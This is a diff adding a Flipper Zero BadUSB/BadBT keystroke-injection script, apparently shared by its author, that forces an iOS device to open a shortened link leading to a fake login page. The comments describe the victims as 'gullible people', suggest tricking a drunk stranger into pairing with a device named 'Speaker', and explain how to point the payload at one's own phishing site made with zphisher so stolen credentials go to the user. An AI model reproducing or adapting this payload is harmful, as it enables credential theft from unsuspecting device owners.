@@ -1,0 +1,28 @@
+REM  /██████╗ ██████╗ ██╗     ███████╗██╗████████╗
+REM  ██╔════╝██╔═══██╗██║     ██╔════╝██║╚══██╔══╝
+REM  ██║     ██║   ██║██║     █████╗  ██║   ██║   
+REM  ██║     ██║   ██║██║     ██╔══╝  ██║   ██║   
+REM  ╚██████╗╚██████╔╝███████╗███████╗██║   ██║   
+REM   ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝   
+REM Made by COLEIT! This is a IOS payload, that targets gullible people that have no idea what is going on. I AM NOT RESPONSIBLE FOR YOUR USE OF THIS.
+REM Basically, this is a customizable payload for IOS devices meant to be used on BadUSB/BadBT with the Flipper Zero! 
+REM Some malicious links can infect the IOS device, and get creds, etc. For now, the link provided will give a fake 'verification' login page and when they provide info... yk
+REM
+REM How does it work? Well, BadBT can be a powerful tool when used on the right targets. Drunk guy on a bus wanting to connect to a speaker? PERFECT! Make the name "Speaker".
+REM
+REM Anyway, enough yapping about let's get into it. This first part will close out of the current app, and open safari, then open the link.
+REM
+GUI SPACE
+DELAY 100
+STRING https://is.gd/NZIp9M
+ENTER
+DELAY 100
+REM !!!!!!README!!!!!! If you want to recieve your victims info (instead of me since the link is auto set to mine lol)
+REM Then simply replace 'https://is.gd/NZIp9M' with YOUR phising website that you make. I use zphisher to create them, you can find it on github.
+REM
+REM  /██████╗ ██████╗ ██╗     ███████╗██╗████████╗
+REM  ██╔════╝██╔═══██╗██║     ██╔════╝██║╚══██╔══╝
+REM  ██║     ██║   ██║██║     █████╗  ██║   ██║   
+REM  ██║     ██║   ██║██║     ██╔══╝  ██║   ██║   
+REM  ╚██████╗╚██████╔╝███████╗███████╗██║   ██║   
+REM   ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝
